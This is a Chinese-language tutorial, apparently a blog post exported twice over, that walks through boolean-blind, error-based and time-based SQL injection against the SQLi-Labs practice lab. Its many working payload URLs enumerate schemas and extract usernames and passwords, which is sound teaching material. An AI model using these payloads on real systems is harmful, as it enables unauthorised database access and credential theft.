limit 0,1)x) - ~0),2,3--+\n```\n\n![bool30](/images/sqlall/bool30.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select table_name from information_schema.tables\nwhere table_schema='security' limit 1,1)x) - ~0),2,3--+\n```\n\n### 2.3.3.爆字段\n\n````bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select column_name from information_schema.columns\nwhere table_name='users' limit 0,1)x) - ~0),2,3--+\n````\n\n![bool31](/images/sqlall/bool31.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select column_name from information_schema.columns\nwhere table_name='users' limit 1,1)x) - ~0),2,3--+\n```\n\n### 2.3.4.爆数据\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select username from security.users limit 0,1)x) -\n~0),2,3--+\n```\n\n![bool32](/images/sqlall/bool32.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select username from security.users limit 1,1)x) -\n~0),2,3--+\n```\n\n## 2.4.Xpath报错注入\n\n主要的是extractvalue函数只要两个参数哦,updatexml是3个,所以在进行构造语句时需要注意.\n\n### 2.4.1.Xpath注入之extractvalue()\n\nmysql> select extractvalue(1,concat(0x7e,(select database()),0x7e));\n\n#### 2.4.1.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1” and extractvalue(1,concat(0x7e,(select database()),0x7e))--+\n```\n\n![bool34](/images/sqlall/bool34.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and extractvalue(1,concat(0x7e,(select user()),0x7e))--+\n```\n\n#### 2.4.1.2.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables\nwhere table_schema='security' limit 0,1),0x7e))--+\n```\n\n![bool36](/images/sqlall/bool36.jpg)\n\n#### 2.4.1.3.爆字段\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and extractvalue(1,concat(0x7e,(select column_name from\ninformation_schema.columns where table_name='users' limit 0,1),0x7e))--+\n```\n\n![bool37](/images/sqlall/bool37.jpg)\n\n#### 2.4.1.6.爆数据\n\n````bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and extractvalue(1,concat(0x7e,(select username from security.users limit\n0,1),0x7e))--+\n````\n\n![bool38](/images/sqlall/bool38.jpg)\n\n### 2.4.2.Xpath注入之updatexml()\n\n#### 2.4.2.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n```\n\n![bool40](/images/sqlall/bool40.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+\n```\n\n#### 2.4.2.3.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables\nwhere table_schema='security' limit 0,1),0x7e),1)--+\n```\n\n![bool41](/images/sqlall/bool41.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables\nwhere table_schema='security' limit 1,1),0x7e),1)--+\n```\n\n#### 2.4.2.4.爆字段\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns\nwhere table_name='users' limit 0,1),0x7e),1)--+\n```\n\n![bool42](/images/sqlall/bool42.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns\nwhere table_name='users' limit 1,1),0x7e),1)--+\n```\n\n#### 2.4.2.5.爆数据\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select username from security.users limit\n0,1),0x7e),1)--+\n```\n\n![bool43](/images/sqlall/bool43.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select username from security.users limit \n1,1),0x7e),1)--+\n```\n\n# 三、时间盲注\n\n时间盲注会称为延时注入,利用页面反回结果所用时间来判断注入是否存在和后期注入进行;\n延时注入是主要针对页面请求时间变化,无法用布尔真假判断、无法报错的情况下的注入技术.\n延时注入作为最精准的注入,但是缺点明显——耗时长要想利用延时注.\n延迟注入常见函数：\nsleep() //延时\nif(condition,true,false) //条件语句\nascii()=ascii码 //转换成ascii码\nsubstr(\"string\",strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符.\n原理： 延时注入的原理就是，所要爆的信息的ascii码正确时,产生延时,否则不延时。实例如下所示\n\n![bool45](/images/sqlall/bool45.jpg)\n\n解析：\n0、mysql> select if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1);\n1、select schema_name from information_schema.schemata limit 0,1 //取出数据库中第一个数据库,\n2、substr(‘string’,1,1) //取出字符串,从第一个字符开始,长度为1,也就是第一个字母/字符\n3、ascii(substr())=ascii码 //对字母/字符进行ascii编码并比较;\n4、if(step1,1,sleep(5)) //如果第一个ascii编码的条件正确,会执行sleep()出现延时几秒,如果条件错误,则会在结果中输出1,可以看到上图的执行结果;\n总结:可以再结合报错注入去猜解服务中数据库、表等信息;当然，延时注入也有不足之处太麻烦,但是较为准确基本能够确定字符;\n\n## 3.1.时间盲注实战\n\n这里采用Sqli-Labs中Less-10的实验来实战测试,为了更能体现出效果所以在延迟注入时,浏览器出现加载信息时出现延迟加载现象,或可以使用Burpsuite工具.\n\n### 3.1.1.访问Less-10\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-10/?id=1\n```\n\n![bool46](/images/sqlall/bool46.jpg)\n\n#### 3.1.2.尝试双引号测试注入\n\nURL:浏览器出现延时,注意网络稳定性,不然会出现混淆;\n\n```bash\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and sleep(5)--+\n```\n\n![bool47](/images/sqlall/bool47.jpg)\n\n#### 3.1.3.爆库\n\n````bash\nURL：115—>s\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and if(ord(mid(database(),1,1))=115,sleep(5),1)--+\n````\n\n![bool48](/images/sqlall/bool48.jpg)\n\n#### 3.1.5.爆表\n\n````bash\nURL：101—>e\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and if(ord(mid((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),1,1))=101,sleep(5),1)--+\n````\n\n![bool50](/images/sqlall/bool50.jpg)\n\n#### 3.1.6.爆字段\n\n```bash\nURL：105—>i\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and if(ord(mid((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),1,1))=105,sleep(5),1)--+\n```\n\n![bool51](/images/sqlall/bool51.jpg)\n\n#### 3.1.7.爆数据\n\n```bash\nURl:68—>D\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and if(ord(mid((select username from security.users limit\n0,1),1,1))=68,sleep(5),1)--+\n```\n\n![bool52](/images/sqlall/bool52.jpg)\n\n其他字段信息请自行搭建环境测试,\n","source":"_posts/SQL注入全解.md","raw":"---\ntitle: SQL注入全解\ndate: 2019-03-06 05:03:38\ntags:\n - 注入\n---\nTip: 这篇将详细介绍盲注/报错/时间延迟注入等三种注入,并在测试环境SQLI-Labs中实现注入;这里说下,[SQLI-Labs](https://github.com/Audi-1/sqli-labs)相比大家都知道其内部实验主要关注SQL注入,且分类众多,对于想学习手工注入、SQL注入可以本地搭建环境进行测试.\n\n|一、布尔盲注   |二、报错注入   |三、时间盲注   |\n|---|---|---|\n|left()函数   |count()&floor(rand())&group by   |sleep()函数   |\n|ascii()和substr函数   |EXP()函数   |if(condition,true,false)\n   |\n|ord()函数&mid()函数   |bigint溢出   |   |\n|regexp正则   |xpath报错注入:extractvalue()、updataxml()\t   |   |\n\n# 一、布尔盲注\n\n## 1.1.left()\n\n```BASH\n格式:left(str,1)>5\n```\n解析:str是字符串,可能是版本号,可能是数据库名等;数字1:指的是从字符串中获取第一个字符,如果想获取第二个字符,直接修改次数字就行,但,注意:后面比较的数字要写上我们探测的第一个字符信息.\n\n```BASH\n示例:\nDatabase()='security'实际值;\nLeft(database(),1)>'s' 没有爆错并测出第一个字符是's'\nLeft(database(),2)>'sh' 需要加第一个字符,否则会爆错的;注意啦啦啦;\n```\n### 1.1.1.爆库\n1.1.1.1.猜测第一个字符\n\n```BASH\nURL:猜测第一个字符是否大于'i'字符\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left(database(),1)>'i'--+\n```\n![bool1](/images/sqlall/bool1.jpg)\n```BASH\nURL:确定第一个字符是s\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left(database(),1)='s'--+\n```\n1.1.1.2.猜解第二个字符\n\n```BASH\nURL:必须添加第一个字符,以便进行猜解第二个字符;\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left(database(),2)='se'--+\n```\n```BASH\nURL:没有第九个字符,会直接报错,如下面URL.\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left(database(),9)>'securitya'--+\n```\n### 1.1.2.爆库\n```BASH\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select schema_name from information_schema.schemata limit\n0,1),1)='i'--+\n```\n![bool2](/images/sqlall/bool2.jpg)\n```BASH\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select schema_name from information_schema.schemata limit\n0,1),12)='information_'--+\n```\n![bool3](/images/sqlall/bool3.jpg)\n\n1.1.2.1.第一张表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),1)='e'--+\n```\n\n![bool4](/images/sqlall/bool4.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),3)=‘ema’--+\n```\n\n1.1.2.2.第二张表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select table_name from information_schema.tables where\ntable_schema='security' limit 1,1),1)='r'--+\n```\n\n![bool5](/images/sqlall/bool5.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select table_name from information_schema.tables where\ntable_schema='security' limit 1,1),2)='re'--+\n```\n\n其他测试可自行继续猜解其他表,其中包含:users等表,具体不作实操;\n\n### 1.1.3.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),1)='i'--+\n```\n\n![bool6](/images/sqlall/bool6.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),2)='id'--+\n```\n\n其他字段名:id、username、password\n\n### 1.1.4.爆数据\n\n```bash\nURL:注意:第一个username是D,大写字符,但是这里无法区分大小写;\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select username from security.users limit 0,1),1)='d'--+\n```\n\n![bool7](/images/sqlall/bool7.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and left((select username from security.users limit 0,1),2)='du'--+\n```\n\n建议:这里不要使用此函数进行猜解,因为无法判断字符哪里是大写哪里是小写的字符;建议使用下面ascii码来判断字符信息;其他部分就不继续猜解,因为字符中存在大小写区分.\n\n## 1.2.ascii()&substr()\n\n```bash\n格式:\nascii(string)>ascii码           ascii转换作用,并与外部进行比较;\nsubstr(string,start,length)  从字符串开始的数字,取出长度为length长度的字符;\n```\n\n下面就利用此paylaod进行获取库中表名:\n\n```bash\nascii(substr((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1))=101\n//注意：database()已经通过以上方式可以获得;\n```\n\nASCII码对照表:http://ascii.911cha.com/\n\n### 1.2.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select database()),1,1))=115 --+\n```\n\n![bool8](/images/sqlall/bool8.jpg)\n\n```bash\n其他URL:101—>'e'\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select database()),2,1))=101 --+\n```\n\n注意:超出字符长度时,设置最小ascii字符,也会报错,说明字符已经猜解完毕\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select database()),9,1))>65 --+\n```\n\n### 1.2.2.爆表\n\n```bash\nURL:101—>'e'\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),1,1))=101 --+\n```\n\n![bool9](/images/sqlall/bool9.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),2,1))=109 --+\n```\n\n和上面一样修改部分数字即可;表名:users、emails等:\n\n### 1.2.3.爆字段\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),1,1))=105 --+\n```\n\n![bool10](/images/sqlall/bool10.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ascii(substr((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),2,1))=100 --+\n```\n\n其他部分不作测试,列名:id、admin、username、password等,我们主要以username和password两列为主;\n\n## 1.3.ord()&mid()\n\n通过以上布尔型盲注后可以获取数据库、表和字段名等信息;其实ord和mid函数的作用和上面我们说的ascii和substr函数一致.\n\n```bash\n格式:\nord(string)     对获取的字符进行ascii码转换;\nmid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1)    截取字段中第一行的第一个字符;\nmid(column_name,start[,length])\n```\n\n### 1.3.1.爆库\n\n```bash\nURL:第一个字符的ASCII码\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ord(mid((select database()),1,1))=115--+\n```\n\n![bool12](/images/sqlall/bool12.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and ord(mid((select database()),2,1))=101--+\n```\n\n后续的注入语句可以参考上面.\n\n## 1.4.regexp正则\n\n通过上面方法我们已经获取数据库和表,此时就是获取字段信息;而,正则表达式法,主要是利用布尔型进行模糊匹配.\n\n```bash\n格式:regexp '^…'\nregexp ‘^…'  and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)\n--+\n```\n\n### 1.4.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 and database() regexp '^[a-z]' limit 0,1) --+\n```\n\n![bool13](/images/sqlall/bool13.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 and database() regexp '^[s-s]' limit 0,1) --+\n```\n\n### 1.4.2.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 from information_schema.tables where table_schema='security' and\ntable_name regexp '^[a-s]' limit 0,1) --+\n```\n\n![bool14](/images/sqlall/bool14.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 from information_schema.tables where table_schema='security' and\ntable_name regexp '^[e-e]' limit 0,1) --+\n```\n\n### 1.4.3.爆字段\n\n````bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and 1=(select 1 from information_schema.columns where table_name='users' and\ncolumn_name regexp '^[a-z]' limit 0,1) --+\n````\n\n其他部分请自行继续.\n\n# 二、报错注入\n\n## 2.1.count&floor&group by\n\ncount(*)、floor(rand(0)*2)和group by的报错原理已经进行分析,可以参考后续:《Mysql注入之报错注入学习与分析->floor、count、group by》具体的语句构造可以参考下面的方式进行..这里省略了注入判断部分.\n\n### 2.1.0.数据库\n\n````bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select user()),0x3a,floor(rand(0)*2))a from\ninformation_schema.columns group by a --+\n````\n\n![bool15](/images/sqlall/bool15.jpg)\n\n### 2.1.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select schema_name from \ninformation_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+\n```\n\n![bool16](/images/sqlall/bool16.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select schema_name from\ninformation_schema.schemata limit 6,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+\n```\n\n### 2.1.2.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select table_name from\ninformation_schema.tables where table_schema='security' limit 0,1),0x3a,floor(rand(0)*2))a from\ninformation_schema.columns group by a --+\n```\n\n![bool17](/images/sqlall/bool17.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select table_name from\ninformation_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))a from\ninformation_schema.columns group by a --+\n```\n\n### 2.1.3.爆字段\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select column_name from\ninformation_schema.columns where table_name='users' limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns\ngroup by a --+\n```\n\n![bool18](/images/sqlall/bool18.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select column_name from\ninformation_schema.columns where table_name='users' limit 2,1),0x3a,floor(rand(0)*2))a from information_schema.columns\ngroup by a --+\n```\n\n### 2.1.4.爆数据\n\n```bash\nURL:这里payload只能爆出一列字段信息\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,scount(*),concat(0x3a,(select username from security.users limit\n0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+\n```\n\n![bool19](/images/sqlall/bool19.jpg)\n\n```bash\n其他URL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select 1,count(*),concat(0x3a,(select password from security.users limit\n0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+\n```\n\n## 2.2.EXP()报错\n\nEXP(x) 返回值e（自然对数的底）的x次方;如果不懂的,可以看这篇文章:《Mysql注入之exp报错注入》\n\nURL：备注：使用EXP函数进行报错时，必须得知列长，如：这里是id、username、password三列\n\n```bash\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+\t\n```\n\n![bool21](/images/sqlall/bool21.jpg)\n\n如果列数量不对时会报错;\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),3--+\n```\n\n### 2.2.1.爆库\n\n```bash\n第一个数据库:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from\ninformation_schema.schemata limit 0,1)a))),2,3--+\n```\n\n![bool23](/images/sqlall/bool23.jpg)\n\n```bash\n第二个数据库:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from\ninformation_schema.schemata limit 1,1)a))),2,3--+\n```\n\n### 2.2.2.爆表\n\n```bash\n第一张表:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from\ninformation_schema.tables where table_schema='security' limit 0,1)a))),2,3--+\n```\n\n![bool24](/images/sqlall/bool24.jpg)\n\n```bash\n第三张表:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from\ninformation_schema.tables where table_schema='security' limit 2,1)a))),2,3--+\n```\n\n### 2.2.3.爆字段\n\n```bash\n第一个字段名:\nhttp://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT column_name from\ninformation_schema.columns where table_name='users' limit 0,1)a))),2,3--+\n```\n\n### 2.2.4.爆数据\n\n```bash\n第一列数据:注意：这里只是爆出username列;\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (exp(~(select * FROM(SELECT username from security.users limit\n0,1)a))),2,3 --+\n```\n\n![bool26](/images/sqlall/bool26.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (exp(~(select * FROM(SELECT username from security.users limit\n1,1)a))),2,3 --+\n```\n\n### 2.2.5.爆两列数据\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (exp(~(select * FROM(SELECT distinct\nconcat(0x3a,username,0x3a,password) from security.users limit 0,1)a))),2,3 --+\n```\n\n![bool27](/images/sqlall/bool27.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (exp(~(select * FROM(SELECT distinct\nconcat(0x3a,username,0x3a,password) from security.users limit 1,1)a))),2,3 --+\n```\n\n## 2.3.bigint溢出\n\n具体产生原理可以阅读《mysql注入之bigint溢出报错注入》其中已经介绍完备;\n\n### 2.3.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select schema_name from\ninformation_schema.schemata limit 0,1)x) - ~0),2,3--+\n```\n\n![bool29](/images/sqlall/bool29.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select schema_name from\ninformation_schema.schemata limit 6,1)x) - ~0),2,3--+\n```\n\n### 2.3.2.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select table_name from information_schema.tables\nwhere table_schema='security' limit 0,1)x) - ~0),2,3--+\n```\n\n![bool30](/images/sqlall/bool30.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select table_name from information_schema.tables\nwhere table_schema='security' limit 1,1)x) - ~0),2,3--+\n```\n\n### 2.3.3.爆字段\n\n````bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select column_name from information_schema.columns\nwhere table_name='users' limit 0,1)x) - ~0),2,3--+\n````\n\n![bool31](/images/sqlall/bool31.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select column_name from information_schema.columns\nwhere table_name='users' limit 1,1)x) - ~0),2,3--+\n```\n\n### 2.3.4.爆数据\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select username from security.users limit 0,1)x) -\n~0),2,3--+\n```\n\n![bool32](/images/sqlall/bool32.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" union select (!(select * from (select username from security.users limit 1,1)x) -\n~0),2,3--+\n```\n\n## 2.4.Xpath报错注入\n\n主要的是extractvalue函数只要两个参数哦,updatexml是3个,所以在进行构造语句时需要注意.\n\n### 2.4.1.Xpath注入之extractvalue()\n\nmysql> select extractvalue(1,concat(0x7e,(select database()),0x7e));\n\n#### 2.4.1.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1” and extractvalue(1,concat(0x7e,(select database()),0x7e))--+\n```\n\n![bool34](/images/sqlall/bool34.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and extractvalue(1,concat(0x7e,(select user()),0x7e))--+\n```\n\n#### 2.4.1.2.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables\nwhere table_schema='security' limit 0,1),0x7e))--+\n```\n\n![bool36](/images/sqlall/bool36.jpg)\n\n#### 2.4.1.3.爆字段\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and extractvalue(1,concat(0x7e,(select column_name from\ninformation_schema.columns where table_name='users' limit 0,1),0x7e))--+\n```\n\n![bool37](/images/sqlall/bool37.jpg)\n\n#### 2.4.1.6.爆数据\n\n````bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and extractvalue(1,concat(0x7e,(select username from security.users limit\n0,1),0x7e))--+\n````\n\n![bool38](/images/sqlall/bool38.jpg)\n\n### 2.4.2.Xpath注入之updatexml()\n\n#### 2.4.2.1.爆库\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n```\n\n![bool40](/images/sqlall/bool40.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+\n```\n\n#### 2.4.2.3.爆表\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables\nwhere table_schema='security' limit 0,1),0x7e),1)--+\n```\n\n![bool41](/images/sqlall/bool41.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables\nwhere table_schema='security' limit 1,1),0x7e),1)--+\n```\n\n#### 2.4.2.4.爆字段\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns\nwhere table_name='users' limit 0,1),0x7e),1)--+\n```\n\n![bool42](/images/sqlall/bool42.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns\nwhere table_name='users' limit 1,1),0x7e),1)--+\n```\n\n#### 2.4.2.5.爆数据\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select username from security.users limit\n0,1),0x7e),1)--+\n```\n\n![bool43](/images/sqlall/bool43.jpg)\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-6/?id=1\" and updatexml(1,concat(0x7e,(select username from security.users limit \n1,1),0x7e),1)--+\n```\n\n# 三、时间盲注\n\n时间盲注会称为延时注入,利用页面反回结果所用时间来判断注入是否存在和后期注入进行;\n延时注入是主要针对页面请求时间变化,无法用布尔真假判断、无法报错的情况下的注入技术.\n延时注入作为最精准的注入,但是缺点明显——耗时长要想利用延时注.\n延迟注入常见函数：\nsleep() //延时\nif(condition,true,false) //条件语句\nascii()=ascii码 //转换成ascii码\nsubstr(\"string\",strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符.\n原理： 延时注入的原理就是，所要爆的信息的ascii码正确时,产生延时,否则不延时。实例如下所示\n\n![bool45](/images/sqlall/bool45.jpg)\n\n解析：\n0、mysql> select if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1);\n1、select schema_name from information_schema.schemata limit 0,1 //取出数据库中第一个数据库,\n2、substr(‘string’,1,1) //取出字符串,从第一个字符开始,长度为1,也就是第一个字母/字符\n3、ascii(substr())=ascii码 //对字母/字符进行ascii编码并比较;\n4、if(step1,1,sleep(5)) //如果第一个ascii编码的条件正确,会执行sleep()出现延时几秒,如果条件错误,则会在结果中输出1,可以看到上图的执行结果;\n总结:可以再结合报错注入去猜解服务中数据库、表等信息;当然，延时注入也有不足之处太麻烦,但是较为准确基本能够确定字符;\n\n## 3.1.时间盲注实战\n\n这里采用Sqli-Labs中Less-10的实验来实战测试,为了更能体现出效果所以在延迟注入时,浏览器出现加载信息时出现延迟加载现象,或可以使用Burpsuite工具.\n\n### 3.1.1.访问Less-10\n\n```bash\nURL:\nhttp://sqli-labs.me:8888/Less-10/?id=1\n```\n\n![bool46](/images/sqlall/bool46.jpg)\n\n#### 3.1.2.尝试双引号测试注入\n\nURL:浏览器出现延时,注意网络稳定性,不然会出现混淆;\n\n```bash\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and sleep(5)--+\n```\n\n![bool47](/images/sqlall/bool47.jpg)\n\n#### 3.1.3.爆库\n\n````bash\nURL：115—>s\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and if(ord(mid(database(),1,1))=115,sleep(5),1)--+\n````\n\n![bool48](/images/sqlall/bool48.jpg)\n\n#### 3.1.5.爆表\n\n````bash\nURL：101—>e\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and if(ord(mid((select table_name from information_schema.tables where\ntable_schema='security' limit 0,1),1,1))=101,sleep(5),1)--+\n````\n\n![bool50](/images/sqlall/bool50.jpg)\n\n#### 3.1.6.爆字段\n\n```bash\nURL：105—>i\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and if(ord(mid((select column_name from information_schema.columns where\ntable_name='users' limit 0,1),1,1))=105,sleep(5),1)--+\n```\n\n![bool51](/images/sqlall/bool51.jpg)\n\n#### 3.1.7.爆数据\n\n```bash\nURl:68—>D\nhttp://sqli-labs.me:8888/Less-10/?id=1\" and if(ord(mid((select username from security.users 